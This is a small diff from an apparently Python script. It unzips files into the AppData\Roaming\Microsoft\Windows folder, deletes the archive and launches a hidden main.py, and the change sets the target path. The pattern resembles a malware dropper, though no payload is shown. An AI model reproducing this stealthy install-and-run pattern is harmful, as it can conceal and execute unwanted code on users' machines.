@@ -20,6 +20,6 @@ with open(os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows
         with zipfile.ZipFile(file_path, 'r') as zip_ref:
             zip_ref.extractall(target_path)
         os.remove(file_path)
-
+target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
 subprocess.Popen(['python', os.path.join(target_path, "skibidi-mainmain", "main.py")])
 
